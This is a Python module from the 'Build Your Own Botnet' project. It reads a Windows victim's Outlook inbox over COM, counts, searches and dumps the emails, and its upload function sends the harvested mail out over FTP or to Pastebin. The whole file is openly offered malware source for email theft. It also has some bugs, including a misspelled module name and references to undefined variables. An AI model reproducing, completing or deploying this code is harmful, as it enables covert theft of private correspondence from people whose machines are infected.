#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os
import sys
import json

# modules

import util

packages = ['win32comext.client','pythoncom']
results  = {}


def installed():
    if os.name == 'nt':
        try:
            pytoncom.CoInitialize()
            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            return True
        except:
            return False


def search(s):
    if os.name == 'nt':
        try:
            pythoncom.CoInitialize()
            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = util.emails(inbox.Items)
            for k,v in emails.items():
                if s not in v.get('message') and s not in v.get('subject') and s not in v.get('from'):
                    emails.pop(k,v)
            return json.dumps(emails, indent=2)
        except Exception as e:
            util.debug("{} error: {}".format(search.func_name, str(e)))


def count():
    if os.name == 'nt':
        try:
            pythoncom.CoInitialize()
            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = inbox.Items
            return "Emails in Outlook inbox: %d" % len(emails)
        except Exception as e:
            util.debug("{} error: {}".format(count.func_name, str(e)))


@util.threaded
def dump():
    if os.name == 'nt':
        try:
            pythoncom.CoInitialize()
            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = util.emails(inbox.Items)
            results.update(emails)
            return "%d emails dumped to results" % len(emails)
        except Exception as e:
            util.debug("{} error: {}".format(dump.func_name, str(e)))


@util.threaded
def upload(mode):
    if os.name == 'nt':
        try:
            if not len(results):
                _ = inbox()
            output = json.dumps(result, indent=2)
            if mode in ('ftp','pastebin'):
                return getattr(util, mode)(output)
            else:
                return "Error: invalid upload mode"
        except Exception as e:
            util.debug("{} error: {}".format(upload.func_name, str(e)))
